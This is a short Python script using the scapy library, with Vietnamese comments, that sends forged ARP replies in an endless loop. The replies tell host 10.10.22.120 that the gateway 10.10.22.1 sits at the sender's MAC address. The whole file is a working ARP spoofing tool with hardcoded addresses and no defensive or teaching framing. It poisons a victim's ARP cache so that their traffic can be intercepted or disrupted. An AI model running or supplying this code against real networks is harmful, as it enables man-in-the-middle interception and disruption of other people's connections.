from scapy.all import *
import time

# Địa chỉ MAC của máy nguồn và đích
SRC_MAC = "2C:58:B9:8B:50:CB" 
DST_MAC = "ff:ff:ff:ff:ff:ff"
DST_IP = "10.10.22.120"        
GATEWAY_IP = "10.10.22.1"      

def arp_spoof(target_ip, target_mac, gateway_ip):
    """
    Hàm gửi gói ARP giả mạo tới máy đích với địa chỉ MAC giả mạo của gateway.
    """
    arp_response = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwsrc=SRC_MAC, hwdst=target_mac)

    send(arp_response, verbose=False)
    print(f"ARP Spoofing: Gửi gói ARP giả mạo tới {target_ip} với địa chỉ MAC {SRC_MAC} giả mạo của gateway {gateway_ip}.")

def arp_spoof_continuously():
    """
    Gửi gói ARP giả mạo liên tục để duy trì trạng thái ARP spoofing.
    """
    while True:
        arp_spoof(DST_IP, DST_MAC, GATEWAY_IP)  
        time.sleep(2)  

if __name__ == "__main__":
    arp_spoof_continuously()